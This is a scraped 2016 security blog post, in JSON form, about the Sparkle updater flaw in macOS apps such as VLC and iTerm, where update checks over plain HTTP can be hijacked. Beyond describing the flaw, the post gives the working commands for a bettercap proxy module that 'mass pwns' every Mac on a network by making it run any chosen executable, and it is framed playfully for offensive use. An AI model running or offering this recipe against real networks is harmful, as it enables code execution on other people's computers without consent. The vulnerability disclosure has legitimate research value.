{
  "Source": "www.evilsocket.net",
  "Title": "OSX Mass Pwning Using BetterCap and the Sparkle Updater Vulnerability.",
  "Link": "https://www.evilsocket.net/2016/01/30/OSX-Mass-Pwning-using-BetterCap-and-the-Sparkle-Updater-Vulnerability/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003ca href=\"http://www.bettercap.org/\" target=\"_blank\"\u003e\n\u003cimg src=\"/images/2016/01/bettercap.png\" alt=\"bettercap\" title=\"\" style=\"width: 100%\"/\u003e\n\u003c/a\u003e\n\u003cp\u003eYesterday \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://twitter.com/radekk\"\u003eRadek\u003c/a\u003e from VulnSec posted an interesting article named “\u003cstrong\u003e\u003ca target=\"_blank\" rel=\"noopener\" href=\"https://vulnsec.com/2016/osx-apps-vulnerabilities/\"\u003eThere’s a lot of vulnerable OS X applications out there.\u003c/a\u003e\u003c/strong\u003e“, he discovered that the \u003cstrong\u003eSparkle\u003c/strong\u003e update system ( used by some very popular OSX apps such as \u003cstrong\u003eVLC\u003c/strong\u003e, \u003cstrong\u003eAdium\u003c/strong\u003e, \u003cstrong\u003eiTerm\u003c/strong\u003e and so forth ) uses HTTP instead of HTTPS to fetch updates informations for such applications, making \u003cstrong\u003eall of them\u003c/strong\u003e vulnerable to \u003cstrong\u003eman in the middle\u003c/strong\u003e attacks and, as he shown, \u003cstrong\u003eremote command execution\u003c/strong\u003e attacks.\u003c/p\u003e\n\u003cp\u003eI’m not going to explain the details of his attack, his post is quite self explainatory, but I’ll show you how easy it is to mass pwn OSX machines on your network using the new \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/evilsocket/bettercap-proxy-modules/blob/master/osxsparkle.rb\"\u003eOSX Sparkle\u003c/a\u003e bettercap proxy module.\u003c/p\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003cp\u003eMoreover, I improved the attack … Radek shown how to get RCE using an OSX terminal profile file, \u003cstrong\u003eI will show you how to make the target execute any Mach-O exetutable you want!\u003c/strong\u003e ( \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.offensive-security.com/metasploit-unleashed/msf-os/\"\u003emetasploit anyone\u003c/a\u003e? )\u003c/p\u003e\n\u003cp\u003eThis is a screenshot of my MacBook Pro running OSX El Capitan with the latest version of VLC installed, being exploited and running a sample “Hello World” binary.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2016/01/yo.png\" alt=\"Hello World Sparkle\"/\u003e\u003c/p\u003e\n\u003cp\u003eOnce you downloaded the aforementioned proxy module, install the \u003cstrong\u003eftpd\u003c/strong\u003e gem:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esudo gem install ftpd\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eand use the bettercap command line:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esudo bettercap --proxy-module osxsparkle.rb --sparkle-rce-file /path/to/some/executable\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhere \u003cstrong\u003e/path/to/some/executable\u003c/strong\u003e is the path to a Mach-O executable on your computer, this is the executable that all the targets are going to execute.\u003c/p\u003e\n\u003cp\u003eWell, enough said, have fun :)\u003c/p\u003e\n\u003c/div\u003e",
  "Date": "2016-01-30T16:57:13Z",
  "Author": "Simone Margaritelli"
}